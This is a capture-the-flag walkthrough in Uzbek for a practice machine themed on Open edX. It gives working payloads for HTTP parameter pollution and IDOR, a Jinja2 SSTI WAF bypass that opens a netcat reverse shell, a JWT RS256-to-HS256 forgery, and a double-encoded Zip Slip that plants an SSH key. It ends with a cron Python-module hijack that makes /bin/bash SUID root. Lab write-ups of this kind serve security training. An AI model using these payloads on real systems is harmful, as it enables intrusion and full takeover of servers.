# RecoveryVault (Open edX) Advanced CTF Writeup

Bu mashina (RecoveryVault) ni yechish va to'liq `root` huquqini qo'lga kiritish uchun siz kamida 3 ta advanced (murakkab) ketma-ketlikdan iborat zaifliklar zanjiridan o'tishingiz kerak bo'ladi. Mashina dizayni zamonaviy online ta'lim tizimi (Open edX arxitekturasi) asosida ishlangan.

---

## 1-Bosqich: Initial Access (Information Disclosure + IDOR + HPP + SSTI) -> `edx` useri

Ushbu bosqich sizni web-ilovadan tizim ichkarisiga (`edx` useri sifatida) olib kirishga qaratilgan.

### 1. Recon (Kashfiyot) va Ro'yxatdan O'tish
Eng avvalo ilovaning ochiq tarmog'iga (`academy.openedx.htb` yoki IP manziliga) kirib, o'zingizga oddiy talaba foydalanuvchi hisobini yaratib, tizimga kirish qilasiz. Profil bo'limlarini o'rganayotganingizda `/settings` (Sozlamalar) kabi sahifalarni ko'rasiz. Shuningdek sub-domain enumeratsiyasi yordamida `admin.openedx.htb` sayti mavjudligini ham topish mumkin, biroq odatiy foydalanuvchi uchun u yopiq (`403 Forbidden`).

### 2. Information Disclosure (Sirlarni Fosh Etish)
Ilovadagi **Xabarlar** (`/messages`) sahifasi hammaga ochiq. Barcha xabarlarni erkin o'qiyotganingizda (58-xabar atrofida) shunday yozuvga ko'zingiz tushadi:
> "Re: ID Migration Phase 2... target is hardcoded to `c4ca4238a0b923820dcc509a6f75849b` in the settings module."

Bu sizga qandaydir "admin" identifikatori xeshi (`c4ca4...` bu MD5 da "1" raqamidir) berilganini bildiradi va aynan `/settings` sahifasiga hujum qilish kerakligiga ishora qiladi.

### 3. HTTP Parameter Pollution (HPP) va IDOR Combo
O'z profilingizni `/settings` da saqlayotganda `Burp Suite` yordamida POST so'rovini tutib qoling. Backendda xavfsizlik filtri faqat **birinchi** uzatilgan ID ni sizning vizual huquqlaringizga mosligini tekshiradi, ammo vazifani bajaruvchi funksiya xatolik evaziga **oxirgi** parametr qiymatini qabul qilib ishlaydi (HPP qoidasi)!
Siz o'z hisobingiz MD5 xeshini (masalan, ID=5 bo'lsa, `e4da3b7fbbce2345d7772b0674a318d5`) va yuqorida topilgan admin xeshini birgalikda yuborasiz:

```http
POST /settings
...
fullname=Hacker&account_id=<SIZNING_XESHINGIZ>&account_id=c4ca4238a0b923820dcc509a6f75849b
```
Natijada sizga "Profile updated" keladi va sizning sessiyangizdagi statusingiz bevosita tizim tomonidan **Admin** (`role=admin`) etib belgilanib qo'yiladi!

### 4. SSTI Bypass va Reverse Shell RCE
Sizda endi "admin" huquqi bor. Darhol `admin.openedx.htb` dagi `Template Builder` (`/admin/template_builder`) moduliga kiring. U yerda Jinja2 Server-Side Template Injection (SSTI) zaifligi mavjud, biroq qattiq WAF (Web Application Firewall) turibdi. 
WAF `{{`, `class`, `import` degan maxsus SSTI atamalarini bloklaydi, lekin... U faqat **birinchi** kelgan `template_data` parametrinigina tekshiradi, Framework esa hamma `template_data` parametrlari qiymatini qo'shib rendering qiladi! 

Reverse shell olish uchun so'rovni bunday jo'nating:
```http
POST /admin/template_builder
...
template_name=Pwnd&template_data=safe_text&template_data={{config.__class__.__init__.__globals__['os'].popen('nc <SIZNING_IP_MANZILINGIZ> <PORT> -e /bin/bash').read()}}
```
Sizning tinglayotgan (listener) terminalingizga `edx` useri huquqida reverse shell tushadi! Marra 1 yakunlandi!

---

## 2-Bosqich: Lateral Movement (JWT Alg Confusion + Double URL Encode Zip Slip) -> `internal` useri

Web tizimi orqasida haqiqiy yadro server yashiringan (`internal`). Ushbu bosqichda siz xuddi shu serverga (internal useriga) o'tishingiz lozim.

### 1. Recon (Ichki Kuzatuv)
`edx` sifatida terminalda `netstat -tulnp` buyrug'ini bersangiz `127.0.0.1:8000` portida ichki (internal) API ishlayotganini sezasiz. Web fayllar (yoki `/opt/openedx/internal/app.py` manba kodi) ga ko'z yugurtirsangiz unda debug darchasi ochiq qolganini va maxsus headerlar (`X-Debug-Mode: enabled`, `X-Test-Auth: guest`) talab qilinishini topasiz.

### 2. JWK Extraction (Ochiq Kalitni O'g'irlash)
Terminal ichidan Curl orqali jwks endpointiga bog'laning:
```bash
curl -H "X-Debug-Mode: enabled" -H "X-Test-Auth: guest" http://127.0.0.1:8000/internal/.well-known/jwks.json
```
Bu erdan siz `n` (Modulus) va `e` (Exponent) larni (RSA jwk kaliti komponentlarini) olasiz. Bular yordamida o'zingizda RSA Ochiq Kalitini (Public Key .pem) qayta tiklab yasab olasiz.

### 3. JWT Algorithm Confusion (RS256 -> HS256)
API faqat Admin JWT tokenga ruxsat beradi. Bizda asimmetrik maxfiy kalit yo'q, lekin biz Algorithm Confusion hujumidan foydalanamiz.
Siz yaratib olgan RSA **Public Key**-dan endi oddiy "Secret Password" (Symmetric HS256) sifatida foydalanib o'zingizga yangi Administrator JWT Token yasab oling: `{"role": "admin"}`. Buni python skriptlari yoki jwt.io kabi vositalar orqali imzolash mumkin. Backend esa buni RS256 o'rniga adashib HS256 kaliti sifatida qabul qilib verifikatsiyadan o'tkazadi. 

### 4. Double Encoded Zip Slip (Arxiv Yordamida Fayl O'qish)
Siz qalbaki Admin JWT tokenni olgach `/admin/upload` ichki API marshrutiga fayl (zip) yubora olasiz.
Zip Slip hujumi yordamida siz o'z SSH Public Key'ingizni `internal` foydalanuvchisiga yozib qo'yishingiz kerak. Biroq himoyani yorib o'tish uchun, fayl yo'llari arxivida ikki marta URL-encode (`%252e%252e%252f`) ishlatilgan "path traversal" bo'lishi kerak.
Siz yaratgan zip arxivi ichidagi fayl nomi: `../../../home/internal/.ssh/authorized_keys` ga mos tushadi (Double Encoded formatda). Faylni jo'nating:

```bash
curl -X POST -H "Authorization: Bearer <Sizning_Soxta_Tokeningiz>" -F "file=@payload.zip" http://127.0.0.1:8000/admin/upload
```
Va endi SSH orqali port 22 dan yoxud local shell'dan bemalol `su internal` / `ssh internal@localhost` deb kira olasiz! 

---

## 3-Bosqich: Privilege Escalation (Python module Hijack) -> `root` useri

Endi biz oddiy server foydalanuvchisidan To'liq Administrator (Root) ga aylanishimiz lozim.

### 1. Cron Recon (Qanday Jarayonlar Ishlayotganligini Ko'rish)
`/etc/cron.d/openedx-system-health` faylini o'qib chiqing. U yerda aniqlaysizki, `root` har doim tizim sog'ligini tekshirish uchun `/usr/local/bin/system_health.py` dasturini ishga tushirib turadi.

### 2. Zaif Konfiguratsiyani Topish
`/usr/local/bin/system_health.py` root nomidan ishlayotgan bo'lsa ham uning ma'lumot uzatuvchi `health.json` konfiguratsiya fayli siz joylashgan (`internal`) huquqi ostida, ya'ni `/opt/openedx/internal/config/health.json` da qolib ketgan. 
Python kodi ushbu konfig faylida ko'rsatilgan `plugin_dir` o'zgaruvchisini dasturga modul kutubxonasi sifatida biriktiradi (import `sys.path`).

### 3. Exploitation (Privesc Python Hijacking)
Siz o'z hisobingizdagi `health.json` ni o'zgartirasiz. Kutubxonalar qidiriladigan papkani `/tmp` ga yo'naltirasiz va yangi (siz yaratadigan) plaginni chaqirishni aytasiz:

```json
{
  "plugin_dir": "/tmp",
  "checks": ["cpu", "memory"]
}
```

So'ngra `/tmp/cpu.py` faylini yaratasiz. Bu python fali `root` huquqida "import" qilib ishlatib yuboriladi:
```python
import os
def run_check():
    os.system("chmod +s /bin/bash")
    return "Health is compromised!"
```

Bir daqiqa kutasiz va cron script ishlagandan keyin, `/bin/bash` SUID qizarib yonadi!
Terminalga shunchaki yozing:
```bash
/bin/bash -p
# whoami
root
```

**TABRIKLAYMAN! Siz The RecoveryVault (Open edX) VM ni to'liq sindirdingiz va CTF Master maqomiga ega bo'ldingiz! Barcha Root Flaglar sizniki!**
